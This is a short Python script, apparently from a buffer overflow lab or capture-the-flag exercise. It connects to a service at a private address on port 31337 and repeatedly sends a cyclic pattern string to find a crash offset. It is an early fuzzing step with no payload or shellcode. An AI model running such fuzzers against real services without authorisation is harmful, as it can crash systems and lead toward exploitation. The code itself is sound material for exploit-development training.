from pwn import *
import sys
import socket
import signal
def crtl_C(signal,frame ):
    print(" [!] Exting...")
    sys.exit(0)
signal.signal(signal.SIGINT, crtl_C)
ip = "192.168.98.24"

port = 31337
timeout=5
string='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("Fuzzing with {} bytes".format(len(string)))
        #s.sendall((string+"\r\n").encode('utf-8'))
        s.send(bytes(string + "\r\n", "latin-1"))
        s.recv(1024)
        s.close()
    except Exception as e:
        print(e)
        sys.exit(0)